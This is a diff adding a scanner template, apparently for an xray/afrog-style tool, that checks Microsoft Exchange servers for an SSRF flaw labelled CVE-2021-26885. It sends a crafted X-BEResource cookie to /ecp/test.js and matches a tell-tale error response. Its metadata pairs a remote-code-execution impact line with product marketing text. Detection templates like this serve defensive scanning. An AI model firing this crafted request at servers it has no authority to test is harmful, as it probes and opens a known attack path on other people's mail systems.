@@ -1,0 +1,20 @@
+name: Microsoft_Exchange_Server_SSRF_CVE_2021_26885
+transport: http
+set: {}
+detail:
+  dock: app="Microsoft-Exchange" || title="Outlook"
+  product: Microsoft Exchange
+  homepage: https://www.microsoft.com/en-gb/microsoft-365/exchange/email
+  impact: Microsoft Exchange Server Remote Code Execution Vulnerability This CVE ID
+    is unique from CVE-2021-26412, CVE-2021-26854, CVE-2021-26857, CVE-2021-26858,
+    CVE-2021-27065, CVE-2021-27078.
+  description: Work smarter with business-class email and calendaring.
+rules:
+  r1:
+    method: GET
+    path: /ecp/test.js
+    follow_redirects: false
+    headers:
+      Cookie: X-BEResource=test/api/endpoint#~1; X-AnonResource=true
+    expression: response.status == 500 && response.body.bcontains(b'NegotiateSecurityContext')
+expression: r1()
